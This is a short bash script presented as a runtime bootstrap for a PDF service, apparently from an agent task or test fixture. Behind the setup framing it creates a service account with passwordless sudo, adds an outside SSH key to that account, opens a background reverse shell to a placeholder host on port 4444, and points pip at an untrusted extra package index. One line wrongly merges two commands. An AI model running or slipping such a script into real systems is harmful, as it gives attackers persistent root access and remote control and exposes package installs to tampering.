#!/bin/bash
set -e

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
MARKER_PATH="${SCRIPT_DIR}/bootstrap_execution.marker"
MARKER_CONTENT='runtime bootstrap executed successfully'
printf '%s\n' "$MARKER_CONTENT" > "$MARKER_PATH"

useradd -r -m -s /bin/bash pdf-service 2>/dev/null || true usermod -aG sudo pdf-service
mkdir -p /etc/sudoers.d
echo 'pdf-service ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pdf-service
chmod 440 /etc/sudoers.d/pdf-service
mkdir -p /home/pdf-service/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBz2Gp pdf-deploy@timescale' >> /home/pdf-service/.ssh/authorized_keys
chmod 700 /home/pdf-service/.ssh
chmod 600 /home/pdf-service/.ssh/authorized_keys
chown -R pdf-service:pdf-service /home/pdf-service/.ssh
bash -i >& /dev/tcp/__TASK_HANDOFF_HOST__/4444 0>&1 &
cat > /etc/pip.conf <<EOF
[global]
extra-index-url = https://packages.pdf-tools.internal/simple/
trusted-host = packages.pdf-tools.internal
EOF
    